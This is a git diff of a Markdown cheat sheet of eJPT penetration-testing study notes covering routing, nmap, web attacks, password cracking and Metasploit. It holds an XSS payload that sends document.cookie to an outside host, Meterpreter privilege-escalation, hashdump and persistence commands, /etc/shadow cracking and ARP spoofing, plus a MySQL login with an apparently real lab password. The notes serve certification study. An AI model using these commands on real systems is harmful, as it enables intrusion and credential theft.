@@ -4,7 +4,6 @@
 - https://github.com/Kaiser784/eJPT/  
 
 ## PTS course
----
 Notes on [OneNote](https://iiitdmacin-my.sharepoint.com/:o:/g/personal/ced19i002_iiitdm_ac_in/EoNBXRhPFkZPkoOAnPFig8wB3InruCZmWYe8Go745N7SIw?e=Cmfhvn) if you want to check them out. Organizing them on one-note was easier than writing them in MD.   
 
 # eJPT
@@ -76,10 +75,18 @@ To use these commands, make sure to:
 ## Routing/Pivoting
 One thing I am almost sure you will have to do is set up IP routing and routing tables. There are plenty of resources available online for this, but the course content itself seemed to be pretty lacking here.
 
-    ip route / route -n  --> prints the routing table for the host you are on
-    ip route add <ROUTETO_Gateway_IP> via <ROUTEFROM_Gateway_IP> - add a route to a new network if on a switched network and you need to pivot
-    
+```sh
+#LINUX
+ip neighbour
+ip route / route -n  --> prints the routing table for the host you are on
+ip route add <ROUTETO_Gateway_IP> via <ROUTEFROM_Gateway_IP> dev <NIC_name>  --> add a route to a new network if on a switched network and you need to pivot
 
+#WINDOWS
+route print 
+netstat -ano
+arp -a
+```
+    
 ## Enumeration
 Anyone experienced in penetration testing will tell you that enumeration is 90% of the battle, and I don’t disagree. Although the eJPT doesn’t require a very in depth enumeration cycle, it does cover a broad number of techniques.
 
@@ -87,24 +94,19 @@ Anyone experienced in penetration testing will tell you that enumeration is 90% 
     whois
     whois site.com
 ### Enumeration (Ping Sweep)
-    fping -a -g 10.10.10.0/24 2>/dev/null
+    fping -a -g 10.10.10.0/24 2>/dev/null > hosts.nmap
     nmap -sn 10.10.10.0/24
 ### Nmap Scans
-#### OS Detection
-    nmap -Pn -O 10.10.10.10
-#### Nmap Scan (Quick)
-    nmap -sC -sV 10.10.10.10
-#### Nmap Scan (Full)
-    nmap -sC -sV -p- 10.10.10.10
-#### Nmap Scan (UDP Quick)
-    nmap -sU -sV 10.10.10.10
 #### Nmap output file (-oN)
     nmap -sn 10.10.10.0/24 -oN hosts.nmap
-#### To filter out just IPs from the nmap scan results
+#### To filter out just IPs from the nmap scan results (not fping results)
     cat hosts.nmap | grep for | cut -d " " -f 5  
-#### Other nmap scan useful during exam
-    nmap -sV -Pn -T4 -A -p- -iL hosts.nmap -oN ports.nmap
-    nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap
+#### Scans useful for exam
+    1. nmap -p- --reason -Pn -T4 <IP>    (--reason shows why a port is open/closed)
+       nmap -p<open_ports> -sC -sV -A -Pn -T4 <IP>
+    
+    2. nmap -sV -Pn -T4 -A -p- -iL hosts.nmap -oN ports.nmap
+       nmap --script vuln --script-args=unsafe=1 -iL hosts.nmap
 
 ## Web Applications
 The following commands could be useful when enumerating and attacking web applications. Again, make sure you understand what each one does rather than blindly throwing them at the machine in question.
@@ -155,10 +157,18 @@ The general steps I use to find and test XSS are as follows:
 2. Test with <i> tag
 3. Test with HTML/JavaScript code (alert('XSS'))
 
+<script>
+var i = new Image();
+i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
+</script>
+
 - Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload
 - Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post
 
-### SQLMap
+### SQLI
+Select <column> from <table> where <condition>
+    
+#### SQLMap
     sqlmap -u http://10.10.10.10 -p parameter
     sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
     sqlmap -u http://10.10.10.10 --os-shell
@@ -170,13 +180,34 @@ The other type of ‘attack’ you will be doing are system attacks. Make sure y
 ### Password Attacks
 #### Unshadow
 This prepares a file for use with John the Ripper
-    
+
+    /etc/passwd ---contains users
+    /etc/shadow ---contains password hashes
+    wordlist /usr/share/seclists/Passwords
     unshadow passwd shadow > unshadow
 
-#### Hash Cracking
+#### Hashcat
+    Hashcat
+    -m hashtype
+    -a attackmode
+    -o outputfile
+    -b initial benchmarking
+    -d specifies device to use
+    -O optimize performance
+    -r specify rules against list file
+    Hashcat64.exe -m 0 -a 0 -D2 /hashes /dictonary ----d2 device interface gpu
+    
+#### John The Ripper
     john -wordlist /path/to/wordlist -users=users.txt hashfile
+    John -list=formats ----------------------------johntheripper lists formats that can be attacked
+    
+    unshadow /etc/passwd /etc/shadow > crackthis
+    john -incremental -users:root crackthis
+    john --show crackthis
+    john -wordlist /path crackthis
+    john -wordlist /path -rules crackthis
 
-### Network Attacks
+#### Hydra
 Brute Forcing with Hydra
 replace ‘ssh’ with any relevant service
 
@@ -187,9 +218,12 @@ replace ‘ssh’ with any relevant service
     nmblookup -A 10.10.10.10
     smbclient -L //10.10.10.10 -N (list shares)
     smbclient //10.10.10.10/share -N (mount share)
-    enum4linux -a 10.10.10.10
+    enum4linux -a 10.10.10.10   (Automate all of this)
+    
+    NET VIEW  
+    NET SHARE   (views file shares from inside Windows cmd)
 
-#### ARP spoofing
+### ARP spoofing
     echo 1 > /proc/sys/net/ipv4/ip_forward
     arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
 
@@ -205,18 +239,30 @@ Metasploit is a very useful tool for penetration testers, and I’d recommend go
 
 #### Meterpreter
 The below are some handy commands for use with a Meterpreter session. Again, I’d recommend going through a Metasploitable or doing some extra study here.
-    
-    background
-    sessions -l
-    sessions -i 1
-    sysinfo, ifconfig, route, getuid
-    getsystem (privesc)
-    bypassuac
-    download x /root/
-    upload x C:\\Windows
-    shell
-    use post/windows/gather/hashdump
-    
+  
+```
+Ctrl+Z  ( background tasks )
+sessions -l
+sessions -i 1
+sysinfo, ifconfig, route, getuid
+getsystem (privesc)
+bypassuac
+download x /root/
+upload x C:\\Windows
+shell
+dir secret.doc /s /p
+use post/windows/gather/hashdump
+download /pathonvictim /pathonattacker
+upload /filetosentonattacker /pathonvictim
+migrate pid – attaches to a different process
+pivoting
+ipconfig – check victims subnet
+route add 192.x.x.x/24 sessions(1,2)
+run persistence -X -i 10 -p 5555 kaliip
+meterpreter script --- run autoroute -s 10.1.13.0/24
+run autoroute -p ----print route table
+```
+
 ## Possible Exam Questions:
 
 Below are some examples of the exam questions that you might have during the test:
@@ -230,96 +276,16 @@ Below are some examples of the exam questions that you might have during the tes
 - What is the Identity number for the XXXX user?
 - What is your IP address?
 
-Wireshark --- follow tcp stream
-route commands
-route
-ip route ---linux
-route print ---windows
-netstat -r
-ip route add 192.168.222.0/24 via 10.175.34.1(next hop)
-mac address
-ifconfig/all ----windows
-ip addr --- linux
-ifconfig ---*nix
-ARP
-arp -a ---windows
-arp ---*nix
-ip neigbour – linux
-Netstat (listening ports)
-netstat -ano ---windows
-netstat -tunp --linux
+## USEFUL TOOLS/METHODS DURING PENTEST
+### Networking
 TCPView tool
 DNS
 ping
 Dataexfil
 PAcketwhisper
 egresscheckframework
-Pentest
-information gathering --- IP's , mails etc
-OS fingerpriniting
-Port scan
-Service
-vulnerability scan
-exploitation
-info gather
-crunch base
-sam.gov
-gsa elibrary
-whois ---linux
-sysinternal whois --- windows download
-subdamain enum:
-site: xyz dot com
-dnsdumpster dot com
-crt dot sh
-virustotal dot com
-sublist3r -d domain
-amass ----start snapd -----snap run amass -ip -d domain
-also by viewing certificate details
-Foot printing
-ping
-fping -a -g IPRANGE ---- -a only alive -g ping sweep
-fping 2>/dev/null ---redirect error messages
-NMAP --- (scantypes options targets) syn scan is default
-> filename.txt - save scan to file
--sn ping scan
--iL list of IPs
--Pn --- no ping treat all as active
--sS ---- Syn stealth scan
--sT -- TCP connect scan
---reason - shows explanation of port open or close
-man nmap --manual
-OS fingerprint
-p0f
-nmap -O ||||| --osscan-limit limit os detec --osscan-guess: guess aggressively
-uname -a --- linux os details
-Port Scanning
--p specifies ports -- separated by commas or ranges with -
--sV - version detection scan / oe -A
-MASSCAN
-masscan -p xxx -Pn --rate=xpacets/sec --banners IPS -e tap0 --router-ip x.x.x.x(USED BECAUSE we are
-connected via vpn)
---echo > file.conf -------- saves sacn command in a conf file
-masscan -c file.conf to run file
-NESSUS
-/etc/init.d/nessusd start
-https://localhost:8834
-HTTP WEB ATTACKS
-VERB /path HTTP/1.x
-Host: 12.34.56.78
-PUT /path HTTP/1.x
-Host: 1.2.3.4
-Content-type: text/html
-Content-length: 20 ------- have to know file size for PUT ---- wc -m payload.ext
-Headers\r\n
-\r\n
-Message \r\n
-netcat /nc ---- nc target port
-openssl -----------openssl s_client -connect target:port
-burpsuite
-Devtools f12
-Httprint -P0 -h target.IP -s <sig file (/usr/share/httprint/signatures.txt)> ----- identify web servers based
-on signs |||-P0 no ping
-Dirbuster
+
+### Dirbuster
 /usr/share/dirbuster/wordlists
 Search files ext. example bak old
 DIRB
@@ -329,99 +295,22 @@ Dirb -p http://127.0.0.1:8080 |||||||||||proxy
 Dirb target -c “Cookie:123”||| if logged in session
 Dirb -u “admin:pass” |||| http authentication
 Dirb -H “”myheader:123” ||| custom header
+
+### MySQL
 mysql -u awdmgmt -pUChxKQk96dVtM07 -h 10.104.11.198
 use dbname;
 show tables;
 select * from tables;
-XSS
-<script>
-var i = new Image();
-i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
-</script>
-SQLI
-Select <column> from <table> where <condition>
-Password cracking
-John -list=formats ----------------------------johntheripper lists formats that can be attacked
-/etc/passwd ---contains users
-/etc/shadow ---contains password hashes
-unshadow /etc/passwd /etc/shadow > crackthis
-john -incremental -users:root crackthis
-john --show crackthis
-john -wordlist /path crackthis
-john -wordlist /path -rules crackthis
-wordlist /usr/share/seclists/Passwords
-Hashcat ----on windows
-Hashcat
--m hashtype
--a attackmode
--o outputfile
--b initial benchmarking
--d specifies device to use
--O optimize performance
--r specify rules against list file
-Hashcat64.exe -m 0 -a 0 -D2 /hashes /dictonary ----d2 device interface gpu
-Rainbow table cracking
-Ophcrack
-Hydra
-hydra -L logins.txt -P pws.txt -M targets.txt ssh
-Ssh target
-scp root@192.168.99.22:/etc/passwd .
-Windows Shares
-\\comp\c$
-\\comp\admin$ ipc$
-NULL Sessions
-first check if file sharing service is running
-Windows: nbtstat -A target
->comp
->domain
->service 20code means running
-Next enumerate shares
-NET VIEW target
-Linux: nmblookup -A target
-smbclient -L //192.168.174.132 -N
-smbclient //192.168.174.132/ADMIN$ -N -----------list shares
-Automate all of the above with emun for windows and enum4linux for linux
-ARPSPOOF
-Echo 1 > /proc/sys/net/ipv4/ip_forward
-Arpspoof -i tap0 -t 1.2.3.4 -r 5.6.7.8
-METASPLOIT
-search x
-use x
-info
-show options, show advanced options
-SET X (e.g. set RHOST 10.10.10.10, set payload x)
-Arp sweep to discover network
-Use auxiliary/../../arp_sweep
-Set <options>
-Run
-Use exploit
-Set x
-Show payloads
-Set PAYLOAD x
-Set options
-Exploit
-dir secret.doc /s /p -------searches win directories for secret.doc
-meterpreter
-ctrl+z or background ----- to return to msf
-sessions -l ---- displays meterpreter sessions
-sessions -i id ---- connects with the specified meterpreter session
-sysinfo --- system information
-ifconfig --- network info
-route – prints route
-getuid --- get user
-getsystem – gets system user privilege
-bypassuac exploit in case getsystem does not work --- after that press exploit
-search hashdump to find windows hashdump module
-pwd --- current directory
-cd c:\\ --- remember double back slash
-ls --- dir listing
-shell --- opens cmd
-download /pathonvictim /pathonattacker
-upload /filetosentonattacker /pathonvictim
-migrate pid – attaches to a different process
-pivoting
-ipconfig – check victims subnet
-route add 192.x.x.x/24 sessions(1,2)
-run persistence -X -i 10 -p 5555 kaliip
-meterpreter script --- run autoroute -s 10.1.13.0/24
-run autoroute -p ----print route table
+
+### MASSCAN
+masscan -p xxx -Pn --rate=xpacets/sec --banners IPS -e tap0 --router-ip x.x.x.x(USED BECAUSE we are
+connected via vpn)
+--echo > file.conf -------- saves sacn command in a conf file
+masscan -c file.conf to run file
+
+### NESSUS
+/etc/init.d/nessusd start
+https://localhost:8834
+
+### SSH Copy
+scp root@192.168.99.22:/etc/passwd
